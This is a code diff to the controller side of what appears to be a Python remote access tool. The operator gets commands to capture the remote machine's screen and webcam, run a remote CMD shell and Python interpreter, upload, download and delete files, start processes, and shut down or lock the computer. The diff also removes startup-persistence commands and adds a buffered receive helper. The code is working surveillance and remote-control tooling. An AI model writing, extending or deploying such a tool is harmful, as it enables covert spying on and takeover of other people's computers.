@@ -1,4 +1,4 @@
-import socket, os, time, re
+import socket, os, re, time
 
 # Socket Properties
 HOST = "0.0.0.0"
@@ -36,6 +36,12 @@ def main():
         except (socket.error, Exception) as e3:
             print(f"[3] Error: ({e3})"); exit(1)
 
+def recvall(buffer):
+    data = b""
+    while (len(data) < buffer):
+        data += recv(buffer)
+    return data
+
 def UsableCommands():
     print("_______________________________________")
     print("(Connection Commands)                  |\n" + \
@@ -56,8 +62,6 @@ def UsableCommands():
     print("[-sp] Start Process on Remote Machine  |")
     print("[-pi] Remote Python Interpreter        |")
     print("[-rs] Remote CMD Shell                 |")
-    print("[-su] Register to Startup              |")
-    print("[-ru] Remove from Startup              |")
     print("[-sc] Shutdown Computer                |")
     print("[-rc] Restart Computer                 |")
     print("[-lc] Lock Computer                    |")
@@ -74,10 +78,10 @@ def UsableCommands():
 def OpenWebpage(pattern="((https?):((//)|(\\\\))+([\w\d:#@%/;$()~_?\+-=\\\.&](#!)?)*)"):
     url = input("\nWebpage URL: ")
     if not (re.match(pattern, url)):
-        print("[Bad URL, use: http/https]\n")
+        print("(Bad URL, use: http/https)\n")
         return
 
-    send(b"open-webpage"); time.sleep(0.2); send(url.encode())
+    send(b"open-webpage"); send(url.encode())
     print(recv(1024).decode() + "\n")
 
 def Screenshot():
@@ -85,22 +89,22 @@ def Screenshot():
         print("(Error Capturing Screen)\n")
         return
 
-    bytesize = recv(1024).decode()
+    buffersize = recv(1024).decode()
     with open("screenshot.png", "wb") as ImageFile:
-        ImageFile.write(recv(int(bytesize)))
+        ImageFile.write(recvall(int(buffersize)))
 
-    print("\n(Screenshot Captured)\n" + f"Total Size: {str(bytesize)}\n")
+    print("\n(Screenshot Captured)\n" + f"Total Size: {str(buffersize)}\n")
 
 def Webcam():
     if not (recv(1024).decode() == "success"):
         print("(No Webcam Detected)\n")
         return
 
-    bytesize = recv(1024).decode()
+    buffersize = recv(1024).decode()
     with open("webcam.png", "wb") as ImageFile:
-        ImageFile.write(recv(int(bytesize)))
+        ImageFile.write(recvall(int(buffersize)))
 
-    print("\n(Screenshot Captured)\n" + f"Total Size: {str(bytesize)}\n")
+    print("\n(Screenshot Captured)\n" + f"Total Size: {str(buffersize)}\n")
 
 def SystemInformation():
     print(f"\nComputer: ({ClientInfo[1]})")
@@ -110,7 +114,7 @@ def SystemInformation():
     print(f"Public IP: ({ClientInfo[5]})\n")
 
 def StartProcess():
-    FileLocation = input("\nRemote File Location (C:/.../file.exe): "); send(FileLocation.encode()); ClientResponse = recv(1024).decode()
+    FileLocation = input("\nRemote File Location: "); send(FileLocation.encode()); ClientResponse = recv(1024).decode()
     if not (ClientResponse == "VALID"):
         print("(Non-Existing File)\n")
         return
@@ -175,40 +179,39 @@ def ViewFiles():
         print("(Non-Existing Directory)\n")
         return
 
-    Number_Of_Files = recv(1024).decode(); time.sleep(0.2); files = recv(45000).decode()
+    Number_Of_Files = recv(1024).decode()
+    buffersize = int(recv(1024).decode())
+    files = recvall(buffersize).decode()
+
     print(f"Files - [{Number_Of_Files}]\n"); print(files + "\n")
 
 def SendFile():
-    FilePath = input("\nFile Path (C:/.../file.exe): ")
+    FilePath = input("\nEnter File Path: ")
     if not (os.path.isfile(FilePath)):
-        print("(Non-Existent File)\n")
-        return
+        print("(Non-Existent File)\n"); return
 
-    send(b"send-file")
-    basename = os.path.basename(FilePath); bytesize = str(os.path.getsize(FilePath))
-    send(basename.encode()); time.sleep(0.2); send(bytesize.encode())
-
+    send(b"send-file"); time.sleep(0.2); send(os.path.basename(FilePath).encode()); time.sleep(0.2); send(str(os.path.getsize(FilePath)).encode())
     with open(FilePath, "rb") as file:
         send(file.read())
 
     print(recv(1024).decode() + "\n")
 
 def ReceiveFile():
-    RemoteFile = input("\nRemote File (C:/.../file.exe): "); send(RemoteFile.encode()); ClientResponse = recv(1024).decode()
+    RemotePath = input("\nRemote File Path: "); send(RemotePath.encode()); ClientResponse = recv(1024).decode()
     if not (ClientResponse == "success"):
-        print("(Non-Existent File)\n")
+        print("(Non-Existing File)\n")
         return
 
-    basename = recv(1024).decode(); bytesize = recv(1024).decode()
-    with open(basename, "wb") as file:
-        file.write(recv(int(bytesize)))
+    filename = recv(1024).decode(); buffersize = int(recv(1024).decode())
+    with open(filename, "wb") as file:
+        file.write(recvall(buffersize))
 
     print("(File Received)\n")
 
 def Delete():
     choice = input("\nDelete File/Directory? (f/d): ").lower()
     if (choice == "f"):
-        send(b"del-file"); file = input("Remote File (C:/.../file.exe): "); send(file.encode()); ClientResponse = recv(1024).decode()
+        send(b"del-file"); file = input("Remote File Path: "); send(file.encode()); ClientResponse = recv(1024).decode()
         if not (ClientResponse == "success"):
             print("(Non-Existent File)\n")
             return
@@ -254,10 +257,6 @@ def RemoteCommands():
                 send(b"python-interpreter"); PythonInterpreter()
             elif (command == "-rs"):
                 send(b"remote-cmd"); RemoteCMD()
-            elif (command == "-su"):
-                send(b"startup"); print(recv(1024).decode() + "\n")
-            elif (command == "-ru"):
-                send(b"rmv-startup"); print(recv(1024).decode() + "\n")
             elif (command == "-sc"):
                 send(b"shutdown-pc"); print(f"Status: ({recv(1024).decode()})\n")
             elif (command == "-rc"):
